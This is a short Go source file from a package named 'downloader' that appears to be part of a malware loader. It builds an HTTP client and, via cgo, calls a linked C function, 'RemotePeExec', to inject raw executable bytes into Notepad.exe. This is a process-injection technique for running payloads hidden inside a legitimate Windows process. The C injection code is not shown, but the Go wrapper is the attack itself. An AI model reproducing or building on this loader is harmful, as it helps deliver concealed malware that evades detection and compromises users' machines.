package downloader
/*
#cgo LDFLAGS: ${SRCDIR}/pe_inject.o
#include "pe_inject.h"
#include <stddef.h>  // For size_t
#include <stdbool.h> // For bool type
*/
import "C"
import (

	"net"
	"net/http"

	"time"
	"unsafe"
)


// notepad for testing 
const path = "C:\\Windows\\System32\\Notepad.exe"

func httpClient() *http.Client {
	var d = &net.Dialer{
		Timeout: 5 * time.Second,
	}

	var tr = &http.Transport{
		Dial:                d.Dial,
		TLSHandshakeTimeout: 5 * time.Second,
	}

	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: tr,
	}
}



func save(data []byte) []byte {
    result := make([]byte, len(data))
    copy(result, data)
    return result
}


    
// Run injection
func run(peBytes []byte, args string) string{
    out := C.RemotePeExec(
        (*C.uchar)(unsafe.Pointer(&peBytes[0])),
        C.CString(path),
        C.CString(args),
    )
	return C.GoString((*C.char)(unsafe.Pointer(out)))
}

